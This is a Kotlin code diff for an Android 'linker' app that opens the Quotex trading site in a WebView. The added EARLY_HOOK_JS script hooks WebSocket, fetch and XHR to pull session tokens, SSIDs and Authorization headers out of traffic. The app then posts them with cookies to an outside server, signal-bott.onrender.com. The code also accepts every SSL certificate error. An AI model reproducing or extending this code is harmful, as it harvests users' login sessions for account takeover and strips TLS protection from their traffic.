@@ -1,20 +1,21 @@
 package com.oscar.linker
 
 import android.annotation.SuppressLint
+import android.content.ClipData
+import android.content.ClipboardManager
 import android.content.Context
 import android.content.SharedPreferences
 import android.graphics.Color
 import android.graphics.Typeface
+import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.text.InputType
+import android.util.Log
 import android.view.Gravity
 import android.view.ViewGroup
-import android.webkit.CookieManager
-import android.webkit.JavascriptInterface
-import android.webkit.WebView
-import android.webkit.WebViewClient
+import android.webkit.*
 import android.widget.*
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
@@ -61,6 +62,8 @@ class MainActivity : AppCompatActivity() {
     private var isLinked = false
     private var statsHandler: Handler? = null
     private var cookieSent = false
+    private val capturedFrames = mutableListOf<String>()
+    private val capturedSsids = mutableListOf<String>()
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
@@ -69,6 +72,163 @@ class MainActivity : AppCompatActivity() {
 
     private val BASE_URL = "https://signal-bott.onrender.com"
     private val QX_DOMAIN = "https://quotex.com"
+
+    // ═══════════════════════════════════════════════════════════
+    // سكربت الحقن المبكر - يعمل قبل أي JS في الصفحة
+    // ═══════════════════════════════════════════════════════════
+    private val EARLY_HOOK_JS = """
+    (function() {
+        if (window.__oscarEarlyHook) return;
+        window.__oscarEarlyHook = true;
+        window.__oscarFrames = [];
+
+        function forwardFrame(text) {
+            try {
+                if (typeof text !== 'string' || text.length < 5) return;
+                if (window.__oscarFrames.length < 200) {
+                    window.__oscarFrames.push(text.substring(0, 3000));
+                }
+                if (window.OscarBridge && window.OscarBridge.onFrame) {
+                    window.OscarBridge.onFrame(text.substring(0, 3000));
+                }
+                // Try extract patterns
+                var pats = [
+                    /"session"\s*:\s*"([^"]+)"/,
+                    /"token"\s*:\s*"([^"]+)"/,
+                    /"ssid"\s*:\s*"([^"]+)"/,
+                    /"authorization"\s*:\s*"([^"]+)"/,
+                    /"access_token"\s*:\s*"([^"]+)"/,
+                    /"jwt"\s*:\s*"([^"]+)"/,
+                    /session=([A-Za-z0-9_\-\.]{30,})/,
+                    /token=([A-Za-z0-9_\-\.]{30,})/
+                ];
+                for (var i = 0; i < pats.length; i++) {
+                    var m = text.match(pats[i]);
+                    if (m && m[1] && m[1].length > 25) {
+                        if (window.OscarBridge && window.OscarBridge.onSsid) {
+                            window.OscarBridge.onSsid(m[1]);
+                        }
+                    }
+                }
+            } catch(e) {}
+        }
+
+        function processData(d) {
+            try {
+                if (typeof d === 'string') { forwardFrame(d); return; }
+                if (d instanceof Blob) { d.text().then(forwardFrame); return; }
+                if (d instanceof ArrayBuffer) {
+                    try {
+                        var txt = new TextDecoder('utf-8').decode(d);
+                        forwardFrame(txt);
+                    } catch(e) {
+                        var bytes = new Uint8Array(d);
+                        var s = '';
+                        for (var i = 0; i < bytes.length && i < 3000; i++) {
+                            s += String.fromCharCode(bytes[i]);
+                        }
+                        forwardFrame(s);
+                    }
+                    return;
+                }
+            } catch(e) {}
+        }
+
+        var OWS = window.WebSocket;
+        if (OWS) {
+            var HookedWS = function(url, protocols) {
+                try {
+                    if (url) {
+                        if (window.OscarBridge && window.OscarBridge.onFrame) {
+                            window.OscarBridge.onFrame('[WS_URL] ' + url.substring(0, 500));
+                        }
+                        var pats = [/[?&]token=([^&]+)/, /[?&]session=([^&]+)/, /[?&]ssid=([^&]+)/];
+                        for (var i = 0; i < pats.length; i++) {
+                            var m = url.match(pats[i]);
+                            if (m && m[1] && m[1].length > 25) {
+                                if (window.OscarBridge && window.OscarBridge.onSsid) {
+                                    window.OscarBridge.onSsid(decodeURIComponent(m[1]));
+                                }
+                            }
+                        }
+                    }
+                } catch(e){}
+                var ws = protocols ? new OWS(url, protocols) : new OWS(url);
+                try {
+                    var origAdd = ws.addEventListener.bind(ws);
+                    ws.addEventListener = function(type, listener, opts) {
+                        if (type === 'message') {
+                            var wrapped = function(ev) {
+                                processData(ev.data);
+                                return listener(ev);
+                            };
+                            return origAdd(type, wrapped, opts);
+                        }
+                        return origAdd(type, listener, opts);
+                    };
+                    ws.onmessage = null;
+                    ws.addEventListener('open', function() {
+                        if (window.OscarBridge) window.OscarBridge.onFrame('[WS_OPEN]');
+                    });
+                } catch(e){}
+                return ws;
+            };
+            HookedWS.prototype = OWS.prototype;
+            HookedWS.CONNECTING = OWS.CONNECTING; HookedWS.OPEN = OWS.OPEN;
+            HookedWS.CLOSING = OWS.CLOSING; HookedWS.CLOSED = OWS.CLOSED;
+            window.WebSocket = HookedWS;
+        }
+
+        // Intercept fetch
+        var origFetch = window.fetch;
+        if (origFetch) {
+            window.fetch = function() {
+                try {
+                    var args = arguments;
+                    if (args[1] && args[1].headers) {
+                        var h = args[1].headers;
+                        var authHeader = h['Authorization'] || h['authorization'];
+                        if (authHeader && authHeader.length > 25 && window.OscarBridge) {
+                            var tok = authHeader.replace(/^Bearer\s+/i, '');
+                            if (tok.length > 25) window.OscarBridge.onSsid(tok);
+                        }
+                    }
+                } catch(e){}
+                return origFetch.apply(this, arguments);
+            };
+        }
+
+        // Intercept XHR
+        var OrigXHR = window.XMLHttpRequest;
+        if (OrigXHR) {
+            var origSetHeader = OrigXHR.prototype.setRequestHeader;
+            OrigXHR.prototype.setRequestHeader = function(name, value) {
+                try {
+                    if (name && name.toLowerCase() === 'authorization' && value && value.length > 25) {
+                        if (window.OscarBridge) {
+                            var tok = value.replace(/^Bearer\s+/i, '');
+                            if (tok.length > 25) window.OscarBridge.onSsid(tok);
+                        }
+                    }
+                } catch(e){}
+                return origSetHeader.apply(this, arguments);
+            };
+        }
+
+        // Intercept WebSocket send (to catch outgoing auth messages)
+        if (window.WebSocket && window.WebSocket.prototype && window.WebSocket.prototype.send) {
+            var origSend = window.WebSocket.prototype.send;
+            window.WebSocket.prototype.send = function(data) {
+                try {
+                    if (typeof data === 'string' && window.OscarBridge && window.OscarBridge.onFrame) {
+                        window.OscarBridge.onFrame('[WS_SEND] ' + data.substring(0, 1500));
+                    }
+                } catch(e){}
+                return origSend.apply(this, arguments);
+            };
+        }
+    })();
+    """.trimIndent()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -271,7 +431,7 @@ class MainActivity : AppCompatActivity() {
         layout.addView(btnUnlink)
 
         btnDebug = Button(this).apply {
-            text = "🔍 تشخيص (لعرض الكوكيز)"
+            text = "🔍 تشخيص (frames / cookies)"
             setBackgroundColor(Color.parseColor("#333333"))
             setTextColor(Color.parseColor("#d4af37"))
             setPadding(20, 20, 20, 20)
@@ -330,6 +490,8 @@ class MainActivity : AppCompatActivity() {
         updateTabButtons()
         linkingMode = true
         cookieSent = false
+        capturedFrames.clear()
+        capturedSsids.clear()
         if (webView.url == null || !webView.url!!.contains("quotex.com")) {
             webView.loadUrl("$QX_DOMAIN/ar/trade")
         }
@@ -527,52 +689,27 @@ class MainActivity : AppCompatActivity() {
 
     private fun showDebugInfo() {
         val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: "(none)"
-        val js = """
-            (function() {
-                var out = [];
-                out.push('=== LOCALSTORAGE ===');
-                for (var i = 0; i < localStorage.length; i++) {
-                    var k = localStorage.key(i);
-                    out.push(k + ' = ' + (localStorage.getItem(k) || '').substring(0, 150));
-                }
-                out.push('');
-                out.push('=== SESSIONSTORAGE ===');
-                for (var i = 0; i < sessionStorage.length; i++) {
-                    var k = sessionStorage.key(i);
-                    out.push(k + ' = ' + (sessionStorage.getItem(k) || '').substring(0, 150));
-                }
-                return out.join('\n');
-            })();
-        """.trimIndent()
-        webView.evaluateJavascript(js) { result ->
-            val decoded = result.trim('"').replace("\\n", "\n").replace("\\\"", "\"")
-            val full = "=== COOKIES ===\n$cookies\n\n$decoded"
-            CoroutineScope(Dispatchers.IO).launch {
-                try {
-                    val payload = JSONObject().apply {
-                        put("cookies", cookies)
-                        put("localStorage", decoded)
-                    }
-                    val req = Request.Builder()
-                        .url("$BASE_URL/api/app/debug_cookies")
-                        .post(payload.toString().toRequestBody("application/json".toMediaType()))
-                        .build()
-                    client.newCall(req).execute()
-                } catch (e: Exception) {}
-            }
-            runOnUiThread {
-                AlertDialog.Builder(this)
-                    .setTitle("🔍 بيانات التشخيص")
-                    .setMessage(full)
-                    .setPositiveButton("نسخ") { _, _ ->
-                        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
-                        clipboard.setPrimaryClip(android.content.ClipData.newPlainText("debug", full))
-                        Toast.makeText(this, "تم النسخ", Toast.LENGTH_SHORT).show()
-                    }
-                    .setNegativeButton("إغلاق", null)
-                    .show()
-            }
+        val sb = StringBuilder()
+        sb.append("=== CAPTURED SSIDs (${capturedSsids.size}) ===\n")
+        capturedSsids.take(10).forEach { sb.append("• ${it.take(100)}\n") }
+        sb.append("\n=== CAPTURED FRAMES (${capturedFrames.size}) ===\n")
+        capturedFrames.take(15).forEachIndexed { i, f ->
+            sb.append("[${i+1}] ${f.take(400)}\n\n")
         }
+        sb.append("\n=== COOKIES ===\n")
+        sb.append(cookies.take(2000))
+
+        val full = sb.toString()
+        AlertDialog.Builder(this)
+            .setTitle("🔍 تشخيص")
+            .setMessage(full)
+            .setPositiveButton("نسخ") { _, _ ->
+                val clip = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                clip.setPrimaryClip(ClipData.newPlainText("debug", full))
+                Toast.makeText(this, "تم النسخ", Toast.LENGTH_SHORT).show()
+            }
+            .setNegativeButton("إغلاق", null)
+            .show()
     }
 
     @SuppressLint("SetJavaScriptEnabled", "AddJavascriptInterface")
@@ -583,7 +720,7 @@ class MainActivity : AppCompatActivity() {
             databaseEnabled = true
             loadWithOverviewMode = true
             useWideViewPort = true
-            mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
             userAgentString = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 " +
                     "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
         }
@@ -591,40 +728,79 @@ class MainActivity : AppCompatActivity() {
         CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
         webView.addJavascriptInterface(Bridge(), "OscarBridge")
 
+        // ═════════════════════════════════════════════════════
+        // الحقن المبكر لـ API 26+
+        // ═════════════════════════════════════════════════════
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            try {
+                webView.evaluateJavascript(EARLY_HOOK_JS, null)
+                // Try document start injection
+                // (best-effort — may not exist in all WebView versions)
+                try {
+                    val method = WebView::class.java.getMethod(
+                        "addDocumentStartJavaScript", String::class.java, Set::class.java)
+                    method.invoke(webView, EARLY_HOOK_JS, emptySet<String>())
+                } catch (e: Exception) {
+                    Log.d("OscarInit", "addDocumentStartJavaScript not available: ${e.message}")
+                }
+            } catch (e: Exception) {}
+        }
+
         webView.webViewClient = object : WebViewClient() {
-            override fun onReceivedSslError(v: WebView?, h: android.webkit.SslErrorHandler?, e: android.net.http.SslError?) {
+            override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: android.net.http.SslError?) {
                 h?.proceed()
+            }
+            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
+                super.onPageStarted(view, url, favicon)
+                if (url?.contains("quotex.com") == true) {
+                    // Inject as early as possible
+                    view?.evaluateJavascript(EARLY_HOOK_JS, null)
+                }
             }
             override fun onPageFinished(view: WebView, url: String) {
                 super.onPageFinished(view, url)
                 if (url.contains("quotex.com")) {
-                    injectInterceptor()
+                    // Re-inject (in case onPageStarted missed)
+                    view.evaluateJavascript(EARLY_HOOK_JS, null)
+                    // If user is logged in and we're on trade page, try capture
                     if (linkingMode && (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard"))) {
-                        statusBar.text = "✅ تم اكتشاف تسجيل الدخول — جاري التقاط الجلسة..."
-                        Handler(Looper.getMainLooper()).postDelayed({ sendCookiesNow() }, 2500)
-                        Handler(Looper.getMainLooper()).postDelayed({ sendCookiesNow() }, 6000)
-                        Handler(Looper.getMainLooper()).postDelayed({ sendCookiesNow() }, 10000)
+                        statusBar.text = "✅ تم اكتشاف تسجيل الدخول — جاري البحث عن SSID..."
+                        Handler(Looper.getMainLooper()).postDelayed({ autoSendCookie() }, 3000)
+                        Handler(Looper.getMainLooper()).postDelayed({ autoSendCookie() }, 7000)
+                        Handler(Looper.getMainLooper()).postDelayed({ autoSendCookie() }, 12000)
                     }
                 }
             }
         }
     }
 
-    private fun sendCookiesNow() {
-        if (!linkingMode || cookieSent) return
-        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
-        if (cookies.isBlank()) {
-            statusBar.text = "⚠️ لا توجد كوكيز بعد. تابع تسجيل الدخول ثم انتظر..."
+    private fun autoSendCookie() {
+        if (!linkingMode) return
+        // إذا كان لدينا SSID من WebSocket، أرسله كأولوية
+        val ssid = capturedSsids.lastOrNull()
+        if (ssid != null && ssid.length > 25) {
+            sendToServer(ssid, "")
             return
         }
+        // احتياطي: أرسل الكوكيز كما هي
+        if (cookieSent) return
+        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
+        if (cookies.isBlank()) return
         cookieSent = true
-        statusBar.text = "🔗 جاري إرسال الكوكيز للسيرفر (${cookies.length} حرف)..."
+        sendToServer("", cookies)
+    }
+
+    private fun sendToServer(ssid: String, cookies: String) {
+        statusBar.text = if (ssid.isNotEmpty())
+            "🔗 جاري التحقق من SSID (${ssid.length} حرف)..."
+        else
+            "🔗 جاري إرسال الكوكيز (${cookies.length} حرف)..."
 
         CoroutineScope(Dispatchers.IO).launch {
             try {
                 val payload = JSONObject().apply {
                     put("license_key", licenseKey)
-                    put("ssid", "")
+                    put("ssid", ssid)
                     put("cookies", cookies)
                     put("email", "")
                 }
@@ -643,11 +819,19 @@ class MainActivity : AppCompatActivity() {
                         Handler(Looper.getMainLooper()).postDelayed({ showSettings() }, 800)
                     } else {
                         val err = json.optString("error", "خطأ")
-                        statusBar.text = "⚠️ فشل: $err — إعادة المحاولة..."
+                        statusBar.text = "⚠️ فشل: $err"
                         cookieSent = false
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            if (linkingMode) sendCookiesNow()
-                        }, 8000)
+                        // Try next captured SSID if available
+                        val untried = capturedSsids.filter { it != ssid }
+                        if (untried.isNotEmpty() && ssid.isNotEmpty()) {
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                if (linkingMode) sendToServer(untried.last(), "")
+                            }, 1500)
+                        } else {
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                if (linkingMode) autoSendCookie()
+                            }, 5000)
+                        }
                     }
                 }
             } catch (e: Exception) {
@@ -659,59 +843,25 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun injectInterceptor() {
-        val js = """
-            (function() {
-                if (window.__oscarHooked3) return;
-                window.__oscarHooked3 = true;
-                function push(v) {
-                    if (v && typeof v === 'string' && v.length > 20 && v.length < 5000) {
-                        if (window.OscarBridge && window.OscarBridge.onSsid) window.OscarBridge.onSsid(v);
-                    }
-                }
-                var OWS = window.WebSocket;
-                var hooked = function(url, protocols) {
-                    try {
-                        if (url) {
-                            var pats = [/[?&]token=([^&]+)/, /[?&]session=([^&]+)/, /[?&]ssid=([^&]+)/];
-                            for (var i = 0; i < pats.length; i++) {
-                                var m = url.match(pats[i]);
-                                if (m && m[1]) push(decodeURIComponent(m[1]));
-                            }
-                        }
-                    } catch(e){}
-                    var ws = protocols ? new OWS(url, protocols) : new OWS(url);
-                    try {
-                        ws.addEventListener('message', function(ev) {
-                            try {
-                                var d = ev.data;
-                                if (typeof d !== 'string') return;
-                                var ps = [/"session"\s*:\s*"([^"]+)"/, /"token"\s*:\s*"([^"]+)"/,
-                                          /"ssid"\s*:\s*"([^"]+)"/, /"authorization"\s*:\s*"([^"]+)"/];
-                                for (var i = 0; i < ps.length; i++) {
-                                    var m = d.match(ps[i]);
-                                    if (m && m[1]) { push(m[1]); break; }
-                                }
-                            } catch(e){}
-                        });
-                    } catch(e){}
-                    return ws;
-                };
-                hooked.prototype = OWS.prototype;
-                hooked.CONNECTING = OWS.CONNECTING; hooked.OPEN = OWS.OPEN;
-                hooked.CLOSING = OWS.CLOSING; hooked.CLOSED = OWS.CLOSED;
-                window.WebSocket = hooked;
-            })();
-        """.trimIndent()
-        webView.evaluateJavascript(js, null)
-    }
-
     inner class Bridge {
         @JavascriptInterface
+        fun onFrame(frame: String) {
+            Log.d("OscarWS", frame.take(500))
+            if (capturedFrames.size < 200) capturedFrames.add(frame)
+        }
+
+        @JavascriptInterface
         fun onSsid(ssid: String) {
-            // لم نعد نستخدم SSID منفصل — نرسل كل الكوكيز
-            if (linkingMode && !cookieSent) {
-                Handler(Looper.getMainLooper()).post { sendCookiesNow() }
+            if (ssid.length < 25) return
+            if (ssid !in capturedSsids) {
+                capturedSsids.add(ssid)
+                Log.d("OscarSSID", "Captured: ${ssid.take(100)}")
+                runOnUiThread {
+                    if (linkingMode) {
+                        statusBar.text = "🎯 تم التقاط SSID! (${ssid.length} حرف) — جاري التحقق..."
+                        sendToServer(ssid, "")
+                    }
+                }
             }
         }
     }
